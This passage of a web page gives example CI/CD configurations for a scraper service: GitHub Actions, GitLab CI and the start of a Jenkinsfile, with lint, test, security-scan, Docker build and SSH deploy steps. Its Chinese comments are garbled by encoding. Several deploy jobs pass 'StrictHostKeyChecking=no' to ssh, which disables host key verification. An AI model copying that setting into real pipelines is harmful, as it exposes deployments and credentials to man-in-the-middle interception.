<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/setup-buildx-action@v3</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build and push</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/build-push-action@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">          </span><span class="nt">file</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./docker/Dockerfile</span>
<span class="w">          </span><span class="nt">push</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">          </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ steps.meta.outputs.tags }}</span>
<span class="w">          </span><span class="nt">labels</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ steps.meta.outputs.labels }}</span>
<span class="w">          </span><span class="nt">cache-from</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">type=gha</span>
<span class="w">          </span><span class="nt">cache-to</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">type=gha,mode=max</span>

<span class="w">  </span><span class="c1"># éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ</span>
<span class="w">  </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deploy to Production</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">needs</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">build-and-push</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">production</span>
<span class="w">      </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://scraper.example.com</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Checkout code</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Setup SSH</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">webfactory/ssh-agent@v0.9.0</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">ssh-private-key</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.SSH_PRIVATE_KEY }}</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deploy to server</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">ssh -o StrictHostKeyChecking=no ${{ secrets.SSH_USER }}@${{ secrets.SSH_HOST }} &lt;&lt; &#39;EOF&#39;</span>
<span class="w">            </span><span class="no">cd /opt/scraper</span>
<span class="w">            </span><span class="no">docker-compose pull</span>
<span class="w">            </span><span class="no">docker-compose up -d</span>
<span class="w">            </span><span class="no">docker-compose ps</span>
<span class="w">          </span><span class="no">EOF</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Health check</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">sleep 10</span>
<span class="w">          </span><span class="no">curl -f https://scraper.example.com/health || exit 1</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Notify deployment</span>
<span class="w">        </span><span class="nt">if</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">always()</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">8398a7/action-slack@v3</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ job.status }}</span>
<span class="w">          </span><span class="nt">text</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;Deployment</span><span class="nv"> </span><span class="s">${{</span><span class="nv"> </span><span class="s">job.status</span><span class="nv"> </span><span class="s">}}&#39;</span>
<span class="w">          </span><span class="nt">webhook_url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.SLACK_WEBHOOK }}</span>
</code></pre>
      </div>

      <h3 id="3-githubworkflowsdocker-publishyml">3. .github/workflows/docker-publish.yml</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Publish Docker Image</span>

<span class="nt">on</span><span class="p">:</span>
<span class="w">  </span><span class="nt">release</span><span class="p">:</span>
<span class="w">    </span><span class="nt">types</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">published</span><span class="p p-Indicator">]</span>

<span class="nt">jobs</span><span class="p">:</span>
<span class="w">  </span><span class="nt">push-to-registry</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Push to Docker Hub</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Log in to Docker Hub</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/login-action@v3</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.DOCKER_USERNAME }}</span>
<span class="w">          </span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.DOCKER_PASSWORD }}</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Extract metadata</span>
<span class="w">        </span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">meta</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/metadata-action@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">images</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.DOCKER_USERNAME }}/scraper</span>
<span class="w">          </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">            </span><span class="no">type=semver,pattern={{version}}</span>
<span class="w">            </span><span class="no">type=semver,pattern={{major}}.{{minor}}</span>
<span class="w">            </span><span class="no">type=raw,value=latest</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build and push</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/build-push-action@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">          </span><span class="nt">push</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">          </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ steps.meta.outputs.tags }}</span>
<span class="w">          </span><span class="nt">labels</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ steps.meta.outputs.labels }}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="gitlab-ci">GitLab CI</h2>

      <h3 id="gitlab-ciyml">.gitlab-ci.yml</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å®šä¹‰é˜¶æ®µ</span>
<span class="nt">stages</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">lint</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">build</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">deploy</span>

<span class="c1"># å…¨å±€å˜é‡</span>
<span class="nt">variables</span><span class="p">:</span>
<span class="w">  </span><span class="nt">PYTHON_VERSION</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;3.11&quot;</span>
<span class="w">  </span><span class="nt">PIP_CACHE_DIR</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;$CI_PROJECT_DIR/.cache/pip&quot;</span>
<span class="w">  </span><span class="nt">DOCKER_DRIVER</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">overlay2</span>
<span class="w">  </span><span class="nt">DOCKER_TLS_CERTDIR</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;/certs&quot;</span>

<span class="c1"># ç¼“å­˜é…ç½®</span>
<span class="nt">cache</span><span class="p">:</span>
<span class="w">  </span><span class="nt">paths</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.cache/pip</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">venv/</span>

<span class="c1"># ä»£ç è´¨é‡æ£€æŸ¥</span>
<span class="nt">lint:flake8</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">lint</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:$PYTHON_VERSION</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install flake8 black mypy</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">black --check .</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">flake8 . --count --statistics</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mypy . --ignore-missing-imports</span>
<span class="w">  </span><span class="nt">only</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">merge_requests</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">develop</span>

<span class="c1"># å•å…ƒæµ‹è¯•</span>
<span class="nt">test:unit</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:$PYTHON_VERSION</span>
<span class="w">  </span><span class="nt">services</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">  </span><span class="nt">variables</span><span class="p">:</span>
<span class="w">    </span><span class="nt">MONGODB_URI</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;mongodb://mongo:27017/&quot;</span>
<span class="w">    </span><span class="nt">REDIS_HOST</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;redis&quot;</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python -m venv venv</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">source venv/bin/activate</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install -r requirements.txt -r requirements-dev.txt</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pytest tests/unit/ --cov=app --cov-report=xml --cov-report=term</span>
<span class="w">  </span><span class="nt">coverage</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;/^TOTAL.+?(\d+\%)$/&#39;</span>
<span class="w">  </span><span class="nt">artifacts</span><span class="p">:</span>
<span class="w">    </span><span class="nt">reports</span><span class="p">:</span>
<span class="w">      </span><span class="nt">coverage_report</span><span class="p">:</span>
<span class="w">        </span><span class="nt">coverage_format</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cobertura</span>
<span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">coverage.xml</span>
<span class="w">    </span><span class="nt">paths</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">htmlcov/</span>
<span class="w">    </span><span class="nt">expire_in</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1 week</span>

<span class="c1"># é›†æˆæµ‹è¯•</span>
<span class="nt">test:integration</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:$PYTHON_VERSION</span>
<span class="w">  </span><span class="nt">services</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python -m venv venv</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">source venv/bin/activate</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install -r requirements.txt -r requirements-dev.txt</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pytest tests/integration/ -v</span>
<span class="w">  </span><span class="nt">only</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">merge_requests</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>

<span class="c1"># å®‰å…¨æ‰«æ</span>
<span class="nt">security:scan</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:$PYTHON_VERSION</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install safety bandit</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">safety check</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bandit -r app/ -f json -o bandit-report.json</span>
<span class="w">  </span><span class="nt">artifacts</span><span class="p">:</span>
<span class="w">    </span><span class="nt">paths</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bandit-report.json</span>
<span class="w">    </span><span class="nt">expire_in</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1 week</span>
<span class="w">  </span><span class="nt">allow_failure</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>

<span class="c1"># æ„å»º Docker é•œåƒ</span>
<span class="nt">build:docker</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">build</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker:24-dind</span>
<span class="w">  </span><span class="nt">services</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker:24-dind</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA -f docker/Dockerfile .</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA $CI_REGISTRY_IMAGE:latest</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker push $CI_REGISTRY_IMAGE:latest</span>
<span class="w">  </span><span class="nt">only</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">tags</span>

<span class="c1"># éƒ¨ç½²åˆ°æµ‹è¯•ç¯å¢ƒ</span>
<span class="nt">deploy:staging</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">deploy</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">alpine:latest</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">apk add --no-cache openssh-client</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">eval $(ssh-agent -s)</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo &quot;$SSH_PRIVATE_KEY&quot; | tr -d &#39;\r&#39; | ssh-add -</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mkdir -p ~/.ssh</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">chmod 700 ~/.ssh</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ssh -o StrictHostKeyChecking=no $SSH_USER@$STAGING_HOST &quot;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">cd /opt/scraper &amp;&amp;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">docker-compose pull &amp;&amp;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">docker-compose up -d</span>
<span class="w">      </span><span class="l l-Scalar l-Scalar-Plain">&quot;</span>
<span class="w">  </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">staging</span>
<span class="w">    </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://staging.scraper.example.com</span>
<span class="w">  </span><span class="nt">only</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">develop</span>

<span class="c1"># éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ</span>
<span class="nt">deploy:production</span><span class="p">:</span>
<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">deploy</span>
<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">alpine:latest</span>
<span class="w">  </span><span class="nt">before_script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">apk add --no-cache openssh-client</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">eval $(ssh-agent -s)</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo &quot;$SSH_PRIVATE_KEY&quot; | tr -d &#39;\r&#39; | ssh-add -</span>
<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ssh -o StrictHostKeyChecking=no $SSH_USER@$PRODUCTION_HOST &quot;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">cd /opt/scraper &amp;&amp;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">docker-compose pull &amp;&amp;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">docker-compose up -d &amp;&amp;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">docker-compose ps</span>
<span class="w">      </span><span class="l l-Scalar l-Scalar-Plain">&quot;</span>
<span class="w">  </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">production</span>
<span class="w">    </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://scraper.example.com</span>
<span class="w">  </span><span class="nt">when</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">manual</span>
<span class="w">  </span><span class="nt">only</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">tags</span>
</code></pre>
      </div>

      <hr />

      <h2 id="jenkins-pipeline">Jenkins Pipeline</h2>

      <h3 id="jenkinsfile">Jenkinsfile</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">pipeline</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="n">agent</span><span class="w"> </span><span class="n">any</span>

<span class="w">    </span><span class="n">environment</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="n">PYTHON_VERSION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;3.11&#39;</span>
<span class="w">        </span><span class="n">DOCKER_REGISTRY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;docker.io&#39;</span>
<span class="w">        </span><span class="n">DOCKER_IMAGE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;myuser/scraper&#39;</span>
<span class="w">        </span><span class="n">DOCKER_CREDENTIALS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">credentials</span><span class="o">(</span><span class="s1">&#39;docker-hub-credentials&#39;</span><span class="o">)</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span><span class="n">options</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="n">buildDiscarder</span><span class="o">(</span><span class="n">logRotator</span><span class="o">(</span><span class="nl">numToKeepStr:</span><span class="w"> </span><span class="s1">&#39;10&#39;</span><span class="o">))</span>
<span class="w">        </span><span class="n">timestamps</span><span class="o">()</span>
<span class="w">        </span><span class="n">timeout</span><span class="o">(</span><span class="nl">time:</span><span class="w"> </span><span class="mi">1</span><span class="o">,</span><span class="w"> </span><span class="nl">unit:</span><span class="w"> </span><span class="s1">&#39;HOURS&#39;</span><span class="o">)</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span><span class="n">stages</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Checkout&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">checkout</span><span class="w"> </span><span class="n">scm</span>
<span class="w">                </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;git rev-parse --short HEAD &gt; .git/commit-id&#39;</span>
<span class="w">                </span><span class="n">script</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">env</span><span class="o">.</span><span class="na">GIT_COMMIT_ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">readFile</span><span class="o">(</span><span class="s1">&#39;.git/commit-id&#39;</span><span class="o">).</span><span class="na">trim</span><span class="o">()</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Setup Python&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                    python${PYTHON_VERSION} -m venv venv</span>
<span class="s1">                    . venv/bin/activate</span>
<span class="s1">                    pip install --upgrade pip</span>
<span class="s1">                    pip install -r requirements.txt -r requirements-dev.txt</span>
<span class="s1">                &#39;&#39;&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Lint&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">parallel</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Black&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                        </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                            . venv/bin/activate</span>
